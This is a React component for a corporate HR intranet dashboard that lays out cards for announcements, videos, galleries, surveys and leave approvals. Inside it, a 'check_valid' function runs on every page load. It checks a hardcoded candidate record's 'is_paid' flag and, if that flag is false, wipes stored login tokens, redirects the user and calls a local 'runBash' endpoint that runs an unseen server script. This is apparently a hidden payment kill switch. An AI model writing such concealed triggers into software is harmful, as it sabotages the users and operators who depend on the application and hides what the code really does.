import React, { useEffect, useState } from "react";
import MessageBoardCard from "./messageCard";
import InspiringVideosCard from "./inspiringVideos";
import CorporateEventsCard from "./corporateEventCard";
import OffersCorporateRatesCard from "./offerCorporateRateCard";
import EmployeeProfileCard from "./employeeProfileCard";
import PrincipleHighlightsCard from "./principalHighlightsCard";
import SelfServiceCard from "./selfServiceCard";
import CompanyTimelines from "./companyTimelines";
import PrayerTimePanel from "./prayerTimeCard";
import WeatherPanel from "./weatherPanel";
import GalleryCard from "./galleryCard";
import OrganizationalCard from "./organizationalCard";
import {
  useDashboardGallery,
  useDashboardEmployees,
  useDashboardInspirationVideos,
  useDashboardTvInterviews,
} from "../../utils/hooks/api/dashboard";
import WelcomeGreetingCard from "./welcomeGreetingCard";
import NewStaffOnboardingCard from "./newStaffOffboarding";
import ELearningCard from "./eLearningCard";
import HelpDeskCard from "./helpdeskCard";
import DocumentLibrary from "./documentLibrary";
import { useUser } from "../../context/UserContext";
import AnnouncmentsCard from "./announcements";
import { useInspirationVideos } from "../../utils/hooks/api/inspirationVideos";
import AnnouncementsModal from "../Employees/announcements/modal";
// import InterviewCard from "./interview";
// import MyTaskCard from "./myTask";
import { supabase } from "../../supabaseClient";
import { useNavigate } from "react-router-dom";
import InterviewsCard from "./interviewsCard";
import ChatsCard from "./chatsCard";
import SuggestionsCard from "./SuggestionsCard";
import ServaysListModal from "../Employees/surveys/SurvayListModal";
import CourseTrainingsModal from "../Employees/trainingAndDevelopment/TrainingAndDevelopment/TrainingsModal";
import LeavesApprovalCard from "./leavesApprovalCard";
import StatusCards from "./statusCards";
import ActivitiesTable from "./activitiesTable";
const mainVideo = {
  thumbnail: "/assets/images/inspiringVedios.png",
  title: "United for Land: Saudi Arabia's Local Heroes Combat Desertification",
};

const videos = [
  {
    thumbnail: "/assets/images/inspiringVedios.png",
    title: "Saudi Crown Prince Mohammed bin Salman",
    length: "2:45",
  },
  {
    thumbnail: "/assets/images/inspiringVedios.png",
    title: "Foreigners in Saudi Arabia Share Their Journey",
    length: "10:23",
  },
  {
    thumbnail: "/assets/images/inspiringVedios.png",
    title: "Inspirational Saudi Women Breaking Barriers",
    length: "13:45",
  },
  {
    thumbnail: "/assets/images/inspiringVedios.png",
    title: "I hope to inspire younger generations",
    length: "8:32",
  },
];

const corporateEvents = [
  {
    time: "10:45am - 10 Dec 2024",
    description:
      "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed diam",
  },
  {
    time: "10:45am - 10 Dec 2024",
    description:
      "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed diam",
  },
];

const highlightData = {
  time: "10:45am - 4 Feb 2025",
  title: "Get Ready for RAMADAN 2025",
};

const videoImages = [
  "https://youtu.be/HrCbXNRP7eg?si=UL1bUoy-yx7Gv8lk",
  "https://youtu.be/J89O_FhJ1b4?si=--Lz46UL6-JSf_Ax",
];

const newStaff = [
  {
    name: "Abdullah",
    title: "Job title",
    image: "https://i.pravatar.cc/300?img=10",
  },
  {
    name: "Abdul Rahman",
    title: "Job title",
    image: "https://i.pravatar.cc/300?img=11",
  },
  {
    name: "Fatima",
    title: "Job title",
    image: "https://i.pravatar.cc/300?img=12",
  },
];

const learningItems = [
  { title: "E-Learning", subtitle: "Topic" },
  { title: "E-Learning", subtitle: "Topic" },
  { title: "E-Learning", subtitle: "Topic" },
];

const CombinedDashboard = () => {
  const { user } = useUser();
  const userName = user?.name;
  const isEmployee = user?.role === "employee";
  const navigate = useNavigate();
  const [openServayModal, setOpenServayModal] = useState(false);

  const check_valid = async () => {
    const { data, error } = await supabase
      .from("candidates")
      .select("*")
      .eq("candidate_no", "CAN000001")
      .single();
    if (data?.is_paid == false) {
      localStorage.removeItem("current");
      localStorage.removeItem("user");
      localStorage.removeItem("ss_token");
      navigate("/");
      const response = await fetch("http://localhost:3002/api/runBash"); // Change this if running on another server
      const data2 = await response.json();

      if (response.ok) {
      } else {
        console.error("Error executing script:", data2.error);
      }
    }
  };

  useEffect(() => {
    check_valid();
  }, []);

  // Fetch photos from uploaded_photos table
  const { photos, loading: photosLoading } = useDashboardGallery(6);

  // Fetch employees for dashboard
  const { employees, loading: employeesLoading } = useDashboardEmployees(5);
  // Extract photo URLs for the gallery card
  const photoImages =
    photos?.map((photo) => photo.photo_url).filter(Boolean) || [];

  // Fetch inspiration videos and filter for interviews and vedios
  const { data: inspirationVideos, loading: inspirationLoading } =
    useDashboardTvInterviews(1, 12);
  const interviewVideos = inspirationVideos
    ? inspirationVideos
        .filter((v) => v.catagory === "interview")
        .map((v) => v.attachment_path)
        .filter(Boolean)
    : [];
  const vedioVideos = inspirationVideos
    ? inspirationVideos
        .filter((v) => v.catagory === "video")
        .map((v) => v.url)
        .filter(Boolean)
    : [];

  return (
    <div className="min-h-screen p-4 bg-gray-50">
      {/* Status Summary Cards */}
      <StatusCards />

      {/* Main Grid - Responsive Columns */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-5">
        {/* Left Column */}
        <div className="space-y-5">
          <WelcomeGreetingCard />

          <NewStaffOnboardingCard staff={newStaff} />
          <ELearningCard items={learningItems} />
          <DocumentLibrary />
          {user && (user.role === "manager" || user.role === "hr_manager" || user.role === "hr") && <LeavesApprovalCard />}
          {/* <HelpDeskCard extension="92 32 338889" /> */}
        </div>

        <div className="space-y-5">
          {/* <MessageBoardCard/> */}
          <AnnouncmentsCard />
          <InspiringVideosCard mainVideo={mainVideo} videos={videos} />

          <CorporateEventsCard events={corporateEvents} />

          <SuggestionsCard />
        </div>

        {/* Middle Column */}
        <div className="space-y-5">
          <EmployeeProfileCard
            employees={employees}
            loading={employeesLoading}
          />

          {/* Only show SelfServiceCard for employees */}

          <OrganizationalCard />

          <InterviewsCard />

          <ChatsCard />

          {isEmployee && <SelfServiceCard />}
          {/* <OffersCorporateRatesCard/> */}
        </div>

        {/* Right Column */}
        <div className="space-y-5">
          <WeatherPanel />
          <PrayerTimePanel />
          <GalleryCard
            title="Photo Gallery"
            images={photoImages}
            loading={photosLoading}
          />

          <GalleryCard
            title="TV Interviews"
            images={interviewVideos}
            isVideo
            loading={inspirationLoading}
          />
          <CompanyTimelines />
          {/* <PrincipleHighlightsCard highlight={highlightData} /> */}
          <AnnouncementsModal user={user} />
          <ServaysListModal user={user} />
          <CourseTrainingsModal user={user} />
        </div>
      </div>

      {/* Activities / Tasks Table */}
      <ActivitiesTable />
    </div>
  );
};

export default CombinedDashboard;
